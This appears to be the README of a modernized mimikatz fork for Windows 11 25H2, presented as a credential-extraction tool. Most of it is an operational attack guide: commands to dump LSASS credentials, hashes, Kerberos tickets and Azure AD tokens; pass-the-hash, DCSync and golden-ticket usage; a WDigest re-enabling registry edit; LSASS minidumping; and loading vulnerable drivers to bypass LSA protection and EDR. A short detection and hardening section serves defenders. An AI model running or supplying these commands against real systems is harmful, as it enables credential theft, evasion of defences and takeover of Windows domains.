# Mimikatz - Windows 11 25H2 Modernized Edition

**Modern credential extraction tool with Windows 11 25H2 support, PPL bypass, and driver-based memory access.**

## ⚠️ Legal Disclaimer

This software is provided for **educational and authorized security research purposes only**. Unauthorized access to computer systems is illegal. Use only in controlled lab environments with explicit permission.

- ✅ Authorized penetration testing
- ✅ Security research in lab environments
- ✅ Defensive security training
- ❌ Unauthorized system access
- ❌ Malicious activities
- ❌ Production systems without authorization

## Overview

This is a modernized fork of the original mimikatz by Benjamin DELPY (gentilkiwi), updated for Windows 11 25H2 with advanced bypass techniques and driver integration.

### Key Features

- ✅ **Windows 11 25H2 Support**: Updated structure definitions for latest Windows builds
- ✅ **PPL Bypass**: Automated vulnerable driver exploitation (BYOVD)
- ✅ **Driver Integration**: Seamless integration with driver-hunter project
- ✅ **Dynamic Structure Resolution**: Pattern-based scanning eliminates hardcoded offsets
- ✅ **Multiple Access Methods**: User-mode, driver-based, or minidump
- ✅ **CloudAP Support**: Azure AD / Entra ID credential extraction
- ✅ **Stealth Techniques**: Anti-detection and evasion capabilities
- ✅ **Comprehensive Documentation**: Detailed guides for all components

### Original Mimikatz

Mimikatz is the original work of **Benjamin DELPY** (@gentilkiwi):
- Original Repository: https://github.com/gentilkiwi/mimikatz
- Author Website: https://blog.gentilkiwi.com
- License: CC BY 4.0

This modernized version builds upon that foundation with Windows 11 specific enhancements.

## Quick Start

### Prerequisites

- Windows 11 (25H2 or earlier)
- Administrator privileges
- Visual Studio 2022 (for building from source)

### Download Pre-built Binary

```powershell
# Download latest release
Invoke-WebRequest -Uri "https://github.com/volume19/mimikatz-modern/releases/latest/download/mimikatz.exe" -OutFile "mimikatz.exe"
```

### Basic Usage

```cmd
# Run mimikatz
mimikatz.exe

# Enable debug privilege
mimikatz # privilege::debug

# Extract all credentials (auto-detects PPL and uses appropriate method)
mimikatz # sekurlsa::logonpasswords

# Extract Kerberos tickets
mimikatz # sekurlsa::tickets /export

# Azure AD credentials
mimikatz # sekurlsa::cloudap
```

### PPL-Protected Systems

On systems with LSA Protection enabled, mimikatz will automatically:
1. Detect PPL status
2. Query driver-hunter database for vulnerable drivers
3. Select and load optimal driver
4. Establish kernel-mode memory access
5. Extract credentials via driver

```
[*] Initializing modern credential extraction
[!] LSASS is PPL-protected
[+] Selected driver: vulnerable_driver.sys (Tool-Alpha: 35)
[+] Driver-based access initialized successfully
[+] Extracting credentials...
```

## Documentation

### For Users

- **[QUICKSTART.md](./QUICKSTART.md)** - Getting started guide
- **[USAGE.md](./USAGE.md)** - Detailed usage examples
- **[FAQ.md](./FAQ.md)** - Frequently asked questions

### For Developers

- **[MODERNIZATION_PLAN.md](./MODERNIZATION_PLAN.md)** - Project roadmap and phases
- **[BUILD.md](./BUILD.md)** - Comprehensive build guide
- **[WINDOWS11_STRUCTURES.md](./WINDOWS11_STRUCTURES.md)** - Windows 11 structure definitions
- **[DRIVER_INTEGRATION.md](./DRIVER_INTEGRATION.md)** - Driver exploitation architecture
- **[ARCHITECTURE.md](./ARCHITECTURE.md)** - System architecture overview
- **[CONTRIBUTING.md](./CONTRIBUTING.md)** - Contribution guidelines

## Building from Source

### Quick Build

```cmd
# Clone repository
git clone https://github.com/volume19/mimikatz-modern.git
cd mimikatz-modern

# Open in Visual Studio
start mimikatz.sln

# Build → Build Solution (Ctrl+Shift+B)
```

### Command Line Build

```cmd
# Load Visual Studio environment
"C:\Program Files\Microsoft Visual Studio\2022\Community\Common7\Tools\VsDevCmd.bat"

# Build x64 Release
msbuild mimikatz.sln /p:Configuration=Release /p:Platform=x64 /m

# Output: x64\Release\mimikatz.exe
```

See **[BUILD.md](./BUILD.md)** for detailed instructions.

## Architecture

### Component Overview

```
mimikatz-modern/
├── mimikatz/              # Main executable
│   ├── modules/
│   │   ├── sekurlsa/     # Credential extraction (CORE)
│   │   ├── crypto/       # Cryptography operations
│   │   ├── lsadump/      # SAM/SECRETS dumping
│   │   └── ...
│   └── mimikatz.c        # Entry point
├── mimilib/              # DLL injection library
├── mimidrv/              # Kernel driver (optional)
├── modules/              # Supporting modules
└── docs/                 # Documentation
```

### Key Modules

**sekurlsa**: Core credential extraction engine
- MSV1_0 (LM/NTLM hashes)
- WDigest (cleartext passwords)
- Kerberos (tickets and keys)
- CloudAP (Azure AD tokens)
- CredMan (stored credentials)

**Driver Integration**: PPL bypass via vulnerable drivers
- Automated driver selection from driver-hunter database
- Multiple loading strategies (service, CIM, registry confusion)
- Kernel-mode memory access
- Stealth techniques

**Crypto**: DPAPI and encryption operations
- Master key recovery
- Certificate extraction
- Key material dumping

**LSADump**: Offline credential extraction
- SAM database parsing
- SECRETS extraction
- Cache credentials (MSCachev2)
- DCSync (domain replication)

## Windows 11 25H2 Support

### Tested Configurations

| Build | PPL | Credential Guard | HVCI | Status |
|-------|-----|------------------|------|--------|
| 27723 | ❌ | ❌ | ❌ | ✅ Working |
| 27723 | ✅ | ❌ | ❌ | ✅ Working (w/ driver) |
| 27723 | ✅ | ✅ | ❌ | ⚠️ Partial (needs bootkey) |
| 27723 | ✅ | ✅ | ✅ | ⚠️ Limited |

### Key Changes for Windows 11 25H2

1. **Updated Structure Definitions**: New MSV1_0_LIST_64_25H2 and related structures
2. **Pattern-Based Scanning**: Dynamic offset resolution replaces hardcoded values
3. **Enhanced CloudAP**: Full Azure AD / Entra ID support
4. **Driver Auto-Selection**: Integration with driver-hunter database
5. **Improved Stealth**: Anti-detection techniques for modern EDRs

See **[WINDOWS11_STRUCTURES.md](./WINDOWS11_STRUCTURES.md)** for technical details.

## Integration with Driver-Hunter

This project integrates with the **driver-hunter** vulnerable driver discovery platform:

**Driver-Hunter Repository**: https://github.com/volume19/driver-hunter

### How It Works

1. **Driver-Hunter** scans internet for Windows drivers and analyzes for vulnerabilities
2. Drivers are scored based on Tool-Alpha (credential dumping) capabilities
3. **Mimikatz-Modern** queries this database when PPL is detected
4. Optimal driver is selected based on:
   - Tool-Alpha score (memory access capability)
   - Windows 11 compatibility
   - Microsoft blocklist status
   - Signature validity
5. Driver is loaded with stealth techniques
6. Kernel-mode memory access established
7. Credentials extracted via driver

### Example Flow

```
User runs: mimikatz.exe sekurlsa::logonpasswords

↓
PPL Detection: LSASS is protected

↓
Query driver-hunter database: Find drivers with Tool-Alpha score ≥ 20

↓
Select optimal driver: vulnerable_driver.sys (score: 35)

↓
Load driver: Use registry confusion technique

↓
Initialize IOCTL interface: Auto-detect memory read/write IOCTLs

↓
Read LSASS memory: Via kernel driver

↓
Extract credentials: Decrypt and display
```

## Command Reference

### Core Commands

```bash
# Authentication
privilege::debug          # Get SeDebugPrivilege
token::elevate            # Impersonate SYSTEM

# Credential Extraction
sekurlsa::logonpasswords  # Extract all credentials
sekurlsa::msv             # Extract LM/NTLM hashes
sekurlsa::wdigest         # Extract WDigest passwords
sekurlsa::kerberos        # Extract Kerberos credentials
sekurlsa::cloudap         # Extract Azure AD credentials
sekurlsa::tickets         # Extract Kerberos tickets
sekurlsa::ekeys           # Extract Kerberos keys
sekurlsa::credman         # Extract Credential Manager

# Process Context
sekurlsa::process         # Reinit to LSASS process
sekurlsa::minidump <file> # Load from minidump file

# Pass-the-Hash
sekurlsa::pth /user:admin /domain:corp /ntlm:hash /run:cmd

# Offline Dumping
lsadump::sam              # Dump SAM database
lsadump::secrets          # Dump LSA secrets
lsadump::cache            # Dump domain cache
lsadump::dcsync /user:krbtgt /domain:corp.local

# Kerberos
kerberos::list            # List tickets
kerberos::ptt <ticket>    # Pass-the-ticket
kerberos::golden          # Create golden ticket

# DPAPI
crypto::certificates /export    # Export certificates
dpapi::masterkey                # Extract master keys

# Driver Management (new)
driver::load <path>       # Load vulnerable driver
driver::unload            # Unload driver
driver::test              # Test driver interface
```

### Advanced Usage

**Enable WDigest (requires reboot)**:
```bash
# Registry modification
privilege::debug
misc::wdigest

# Or manually
reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 1
```

**Export Everything**:
```bash
log output.txt
privilege::debug
sekurlsa::logonpasswords
sekurlsa::tickets /export
crypto::certificates /export
dpapi::masterkey
```

**DCSync (Domain Controller)**:
```bash
lsadump::dcsync /user:Administrator /domain:corp.local
lsadump::dcsync /user:krbtgt /domain:corp.local  # For golden tickets
```

## Troubleshooting

### "ERROR kuhl_m_sekurlsa_acquireLSA"

**Cause**: Cannot access LSASS memory

**Solutions**:
1. Run as Administrator
2. Enable debug privilege: `privilege::debug`
3. If PPL enabled, ensure driver loaded successfully
4. Try minidump mode: `sekurlsa::minidump lsass.dmp`

### "Access Denied" / "OpenProcess failed"

**Cause**: LSA Protection (PPL) is enabled

**Solutions**:
1. Mimikatz will auto-load driver if database available
2. Manually specify driver: `driver::load C:\path\to\driver.sys`
3. Create minidump: `procdump -ma lsass.exe lsass.dmp`
4. Use offline mode: `sekurlsa::minidump lsass.dmp`

### No Credentials Found

**Causes**:
- WDigest disabled (default on Windows 11)
- Credential Guard enabled
- Recent Windows updates changed structures

**Solutions**:
1. Enable WDigest and wait for new logon
2. Extract Kerberos tickets instead: `sekurlsa::tickets`
3. Try CloudAP for Azure AD: `sekurlsa::cloudap`
4. Use NTLM hashes: `sekurlsa::msv`

### Driver Load Failed

**Causes**:
- Driver blocked by Microsoft blocklist
- HVCI/VBS enabled
- Insufficient privileges
- Driver signature invalid

**Solutions**:
1. Check blocklist status
2. Try different driver from database
3. Disable HVCI temporarily (requires reboot)
4. Use CIM loading technique

## Detection and Mitigation

### How to Detect Mimikatz

**Indicators of Compromise (IOCs)**:
- Process name: `mimikatz.exe`
- Console output strings: "mimikatz", "gentilkiwi", "sekurlsa"
- LSASS memory access from unusual process
- Loaded vulnerable drivers
- Event ID 4673 (sensitive privilege use)
- Event ID 4688 (process creation with suspicious args)

**EDR Detections**:
- Credential dumping behavior
- LSASS memory reads
- Suspicious driver loads
- Known mimikatz signatures

### How to Prevent

**System Hardening**:
1. **Enable LSA Protection (PPL)**:
   ```reg
   reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v RunAsPPL /t REG_DWORD /d 1
   ```

2. **Enable Credential Guard**:
   - Enable VBS (Virtualization-Based Security)
   - Enable HVCI (Hypervisor-protected Code Integrity)
   - Enable Credential Guard

3. **Disable WDigest**:
   ```reg
   reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 0
   ```

4. **Enable Driver Blocklist**:
   - Keep Windows updated
   - Enable Memory Integrity in Windows Security
   - Block known vulnerable drivers via WDAC policy

5. **Deploy EDR**: Modern endpoint detection and response solutions

6. **Least Privilege**: Minimize local admin accounts

7. **Network Segmentation**: Limit lateral movement

## Project Status

### Current Phase: Phase 1 - Analysis & Documentation ✅

**Completed**:
- ✅ Comprehensive documentation suite
- ✅ Windows 11 25H2 structure research
- ✅ Driver integration architecture
- ✅ Build system documentation
- ✅ Git repository initialization

**In Progress**:
- 🔄 Structure implementation for Windows 11 25H2
- 🔄 Pattern-based offset resolution
- 🔄 Driver interface implementation

**Planned**:
- 📋 Phase 2: Core Modernization (3-4 weeks)
- 📋 Phase 3: Driver Integration (2-3 weeks)
- 📋 Phase 4: Advanced Bypasses (3-4 weeks)
- 📋 Phase 5: Testing & Validation (2-3 weeks)

See **[MODERNIZATION_PLAN.md](./MODERNIZATION_PLAN.md)** for detailed roadmap.

## Contributing

Contributions are welcome! Please read **[CONTRIBUTING.md](./CONTRIBUTING.md)** first.

### Areas for Contribution

- Windows 11 structure validation
- Driver compatibility testing
- EDR evasion techniques
- Documentation improvements
- Bug fixes and optimizations

### Responsible Disclosure

If you discover security vulnerabilities in Windows, please follow Microsoft's responsible disclosure process:
- **Microsoft Security Response Center**: https://msrc.microsoft.com

## License

This project maintains the original mimikatz CC BY 4.0 license:
- https://creativecommons.org/licenses/by/4.0/

**Attribution**: Based on mimikatz by Benjamin DELPY (@gentilkiwi)
**Modernization**: Will Burns (Volume19) - willburns89@gmail.com

## Related Projects

- **mimikatz (original)**: https://github.com/gentilkiwi/mimikatz
- **driver-hunter**: https://github.com/volume19/driver-hunter
- **PPLdump**: https://github.com/itm4n/PPLdump
- **nanodump**: https://github.com/fortra/nanodump
- **pypykatz**: https://github.com/skelsec/pypykatz

## Support and Contact

- **GitHub Issues**: https://github.com/volume19/mimikatz-modern/issues
- **Email**: willburns89@gmail.com
- **Twitter**: @volume19

## Acknowledgments

- **Benjamin DELPY (@gentilkiwi)**: Original mimikatz author
- **Windows Internals Community**: Structure research and documentation
- **Security Researchers**: Various PPL bypass and credential extraction techniques
- **Driver-Hunter Project**: Vulnerable driver discovery platform

## Disclaimer (Repeated for Emphasis)

**THIS SOFTWARE IS FOR EDUCATIONAL AND AUTHORIZED SECURITY RESEARCH ONLY**

Unauthorized access to computer systems is **illegal**. The author and contributors are not responsible for misuse of this software. Use only in controlled environments with explicit written authorization.

---

**Version**: 3.0.0-alpha
**Last Updated**: 2025-10-22
**Status**: Active Development
**Author**: Will Burns (Volume19)
**Original Author**: Benjamin DELPY (@gentilkiwi)
